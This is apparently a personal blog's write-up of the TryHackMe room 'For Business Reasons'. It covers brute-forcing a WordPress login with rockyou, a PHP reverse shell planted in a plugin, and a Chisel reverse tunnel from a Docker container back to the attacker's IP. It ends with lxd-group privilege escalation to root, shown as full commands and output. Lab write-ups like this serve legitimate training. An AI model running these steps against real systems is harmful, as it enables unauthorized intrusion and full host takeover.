---
layout: post
title: CTF Log - For Business Reasons {THM}
description: A log of how I did the TryHackMe room For Business Reasons by MsMouse
summary: A log of the THM room "For Business Reasons"
tags: ctf log
minute: 9
---
<br/>

> {{ page.description }}

<br/>

# For Business Reasons
## Wordpress Login Bruteforce & Plugin Reverse Shell
Scanned and received responses from the following ports: 22, 80, 2377, 7946. Only port 80 registered as open. 

Found a Wordpress blog and noticed that the default/template posts were made by a user named `sysadmin.` So, I chucked a `rockyou.txt` bruteforce against that username while I further enumerated the site. 

Soon after, I landed a valid password. 

I chucked a `rockyou.txt` bruteforce against the username `sysadmin` while I researched that vulnerability and landed a valid password.

Edited an existing plugin to include a PHP reverse shell and enabled the plugin; got a shell as `www-data` in a Docker container.

## Proxying Through Docker Container
The Docker container I landed in was lacking a lot core networking utils like `ping`, `ip`, `ifconfig`, etc. After poking around for a while I stumbled upon [this](https://staaldraad.github.io/2017/12/20/netstat-without-netstat/) fantastic blog post by [Staaldraad](https://staaldraad.github.io/). In it they detail some research into parsing data from the `/proc/net/tcp` pseudofile to recreate the `netstat` and `id` commands. 

I use their `awk` script:

```bash
{% raw %}
awk 'function hextodec(str,ret,n,i,k,c){
    ret = 0
    n = length(str)
    for (i = 1; i <= n; i++) {
        c = tolower(substr(str, i, 1))
        k = index("123456789abcdef", c)
        ret = ret * 16 + k
    }
    return ret
}
function getIP(str,ret){
    ret=hextodec(substr(str,index(str,":")-2,2)); 
    for (i=5; i>0; i-=2) {
        ret = ret"."hextodec(substr(str,i,2))
    }
    ret = ret":"hextodec(substr(str,index(str,":")+1,4))
    return ret
} 
NR > 1 {{if(NR==2)print "Local - Remote";local=getIP($2);remote=getIP($3)}{print local" - "remote}}' /proc/net/tcp
{% endraw %}
```

to see the current open TCP connections. 

![Screenshot of aforementioned awk script and output.](/assets/media/forbusinessreasons/proc_net_tcp_netstat.png)

I noticed a connection between `172.18.0.3` and `10.13.1.225`. Since the latter is my attack machine's IP address I conclude that the former IP address belongs to the container that I'm in. From there I correctly assume that the gateway address of that subnet, `172.18.0.1`, belongs to the machine hosting the Docker container; I use the following to scan for certain ports on that address. 
```bash
curl -m 1 --include -v localhost:$x
```

- `-m 1` Setting a max timeout time for the curl attempt, prevents me from getting stuck on an unresponsive port, which would require me to `ctrl+c` and thusly break my non-pty shell.

After identifying an open port 22 on the host machine, I download [Chisel](https://github.com/jpillora/chisel) onto the docker container and launch the client command: 

```bash

$ ./chisel client 10.13.1.225:1234 R:2002:172.168.0.1:22
2021/09/13 21:34:59 client: Connecting to ws://10.13.1.225:1234
2021/09/13 21:35:00 client: Connected (Latency 184.290108ms)
```

And on my attacker machine, the server command:

```bash
┌──(kali㉿kali)-[/opt/chisel/binaries]
└─$ ./chisel_1.7.6_linux_amd64 server -p 1234 --reverse

2021/09/13 16:32:53 server: Reverse tunnelling enabled
2021/09/13 16:32:53 server: Fingerprint gOtbf9dlNJ2ecdo44g20iAMt+SSp8NkeAfp5CWKusaU=
2021/09/13 16:32:53 server: Listening on http://0.0.0.0:1234
```

I'm then able to ssh against my local machine and have my request proxied through to the victim host machine. The credentials for `sysadmin` are reused from the Wordpress blog.

## lxc Privileged, Recursive Container Filesystem Privesc
The privilege escalation technique is simple. My user, `sysadmin`, belongs to the `lxd` group which by default allows that user to use `lxc` to escalate privileges. 

I create an [Alpine](https://hub.docker.com/_/alpine) container on my attacker machine using [Distrobuilder](https://github.com/lxc/distrobuilder) then download the resulting files onto the victim machine. 

I then execute the following sequence of commands (Learned from [Hacktricks](https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)) to create a privileged docker container whose filesystem contains a recursive mount of the host machine's filesystem. This allows me to enter the docker container as `root` and act upon the host filesystem as `root`.

```bash
sysadmin@ubuntu:~$ lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
Image imported with fingerprint: 02aa7f299f733b42a726c44d6505645cf23e67ebcb31fda3ec24e8c2d4c0497b             
sysadmin@ubuntu:~$ lxc init alpine privesc -c security.privileged=true             
Creating privesc
sysadmin@ubuntu:~$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
Device host-root added to privesc
sysadmin@ubuntu:~$ lxc start privesc
sysadmin@ubuntu:~$ lxc exec privesc /bin/sh
~ # id
uid=0(root) gid=0(root)
```